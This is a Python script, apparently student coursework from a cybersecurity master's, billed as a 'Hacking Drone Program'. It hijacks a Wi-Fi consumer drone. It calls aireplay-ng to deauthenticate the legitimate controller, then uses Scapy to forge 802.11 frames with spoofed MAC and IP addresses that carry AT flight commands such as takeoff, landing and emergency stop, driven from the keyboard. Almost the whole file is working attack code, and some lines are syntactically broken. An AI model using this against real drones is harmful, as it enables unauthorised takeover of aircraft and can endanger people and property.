#!/usr/bin/env python

#############################################
#	Programme Python type											#
#	Auteurs : 	Aurelien Monnet-Paquet				#
#							Francesco Furfaro							#
#							Benoit Peynet									#
#############################################



#############################################
#	Importation de fonctions externes :
from scapy.all import *
import sys
import time
import pygame
from optparse import OptionParser



#############################################
#	Definition locale de fonctions :
def commands():
	print "Commands available :"
	print "\tARROW UP \t: Move forward"
	print "\tARROW DOWN \t: Move backward"
	print "\tARROW RIGHT \t: Move to the right"
	print "\tARROW LEFT \t: Move to the left"
	print "\t--"
	print "\tZ : Increase vertical position"
	print "\tS : Decrease vertical position"
	print "\tQ : Turn left (without movement)"
	print "\tD : Turn right (without movement)"

###################   ZERO PACKET   ###################
def zero():
	global seq
	send(Raw(load='AT*PCMD='+str(seq)+',0,0,0,0,0\r'))

###################   DECOLLAGE   ###################
def takeoff():
	print "Takeoff !!"
	send(Raw(load='AT*REF='+str(seq)+',290718208\r'))

###################   ATTERRISSAGE   ###################
def landing():
	send(Raw(load='AT*REF='+str(seq)+',290717696\r'))

###################   EMERGENCY   ###################
def emergency():
	send(Raw(load='AT*REF='+str(seq)+',290717952\r'))

###################   MONTE   ###################
def up():
	global seq
	send(Raw(load='AT*PCMD='+str(seq)+',1,0,0,1045220557,0\r'))

###################   DESCEND   ###################
def down():
	global seq
	send(Raw(load='AT*PCMD='+str(seq)+',1,0,0,-1045220557,0\r'))

###################   TOURNE A DROITE   ###################
def noseright():
	send(Raw(load='AT*PCMD='+str(seq)+',1,0,0,0,1045220557\r'))

###################   TOURNE A GAUCHE   ###################
def noseleft():
	global seq
	send(Raw(load='AT*PCMD='+str(seq)+',1,0,0,0,-1045220557\r'))

###################   RECULE   ###################
def recule():
	global seq
	send(Raw(load='AT*PCMD='+str(seq)+',1,0,1045220557,0,0\r'))

###################   AVANCE   ###################
def avance():
	global seq
	send(Raw(load='AT*PCMD='+str(seq)+',1,0,-1045220557,0,0\r'))

###################   DEPLACE A DROITE   ###################
def droite():
	global seq
	send(Raw(load='AT*PCMD='+str(seq)+',1,1045220557,0,0,0\r'))

###################   DEPLACE A GAUCHE   ###################
def gauche():
	global seq
	send(Raw(load='AT*PCMD='+str(seq)+',1,-1045220557,0,0,0\r'))

###################   DEAUTH USER FUNCTION   ###################
def deauth():
	print "**** Let's DEAUTH the user ! ****"
	nb = raw_input("How many packets send ? [1-50] (dflt=5)")
	if nb == '' or nb < 1 or nb > 50:
		nb = 5
	rep = raw_input("Broadcast/Target mode ? [B/t]")
	if rep == 'B' or rep == 'b' or rep == '':
		print "Broadcast deauth running"
		os.system("aireplay-ng -0 "+nb+" -a 90:03:b7:fd:22:49 "+interface)
	else:
		rep = raw_input("Use "+MAC_src+" ? [Y/n]")
		if rep == 'Y' or rep == 'y' or rep == '':
			os.system("aireplay-ng -0 "+nb+" -a 90:03:b7:fd:22:49 -c "+MAC_src+" "++interface)
		else:
			rep = raw_input("Enter MAC address to deauth : ")
			os.system("aireplay-ng -0 "+nb+" -a 90:03:b7:fd:22:49 -c "+rep+" "++interface)


def send(command):
	global seq
	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2=MAC_src, 
 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src=ip_src, dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq+1
	payload = command
	pkt = RadioTap()/dot11h/ipudph/payload

	sendp(pkt,iface=interface,count=1,verbose=0)




#############################################
#	Corps principal du programme
print "#########################################"
print "#  Hacking Drone Program v1.0\t\t#"
print "#  Autors :\tAurelien Monnet-Paquet\t#"
print "#\t\tFrancesco Furfaro\t#"
print "#\t\tBenoit Peynet\t\t#"
print "#  Master 2 CyberSecurity\t\t#"
print "#  Advanced Security\t\t\t#"
print "#########################################"
print "\n"

parser = OptionParser(usage="usage: %prog [options]",
                          version="%prog 1.0")
parser.add_option("-i",
                  dest="ip_address",
                  default='192.168.1.2',
                  help="Use the IP ADDRESS as source")
parser.add_option("-m",
                  dest="MAC_address",
                  default='50:55:27:ef:e9:6d',
                  help="Use the MAC ADDRESS as source",)
parser.add_option("-f",
                  dest="interface",
                  default='mon0',
                  help="Use the INTERFACE",)
parser.add_option("-c",
				  dest="commands",
				  action="store_true",
                  default=False,
                  help="Print all flying commands available",)
parser.add_option("-d",
				  dest="deauth",
				  action="store_true",
                  default=False,
                  help="Deauthenticate user",)
(options, args) = parser.parse_args()

if len(args) > 4:
    parser.error("wrong number of arguments")

# ip_drone = '192.168.1.1'
#MAC_drone = '90:03:b7:fd:22:49'
seq = 1000
ip_src = options.ip_address
MAC_src = options.MAC_address
interface = options.interface
if options.deauth:
	deauth()
if options.commands:
	commands()


## DEBUT DE L'APPLICATION ##
pygame.init()
pygame.display.set_caption('Time to Hack a Drone')
W, H = 320, 240
screen = pygame.display.set_mode((W, H))
clock = pygame.time.Clock()
running = True
while running:
	for event in pygame.event.get():
		if event.type == pygame.QUIT:
			running = False 
		elif event.type == pygame.KEYUP:
			zero()
		elif event.type == pygame.KEYDOWN:
			if event.key == pygame.K_ESCAPE:
				running = False
			# takeoff / land
			elif event.key == pygame.K_RETURN:
				takeoff()
			elif event.key == pygame.K_SPACE:
				print "Landing !!"
				landing()
			# emergency
			elif event.key == pygame.K_BACKSPACE:
				print "EMERGENCY !!!!"
				emergency()
			# Monte / Descend
			elif event.key == pygame.K_z:
				print "Monte"
				up()
			elif event.key == pygame.K_s:
				print "Descend"
				down()
			# Tourne a gauche / droite (pas de deplacement)
			elif event.key == pygame.K_q:
				print "Tourne a gauche"
				noseleft()
			elif event.key == pygame.K_d:
				print "Tourne a droite"
				noseright()
			# Avance / Recule
			elif event.key == pygame.K_UP:
				print "Avance"
				avance()
			elif event.key == pygame.K_DOWN:
				print "Recule"
				recule()
			# Deplacement a gauche / roite
			elif event.key == pygame.K_LEFT:
				print "Deplace a gauche"
				gauche()
			elif event.key == pygame.K_RIGHT:
				print "Deplace a droite"
				droite()
	pygame.display.flip()
	clock.tick(50)

print "Shutting down...",
print "Ok."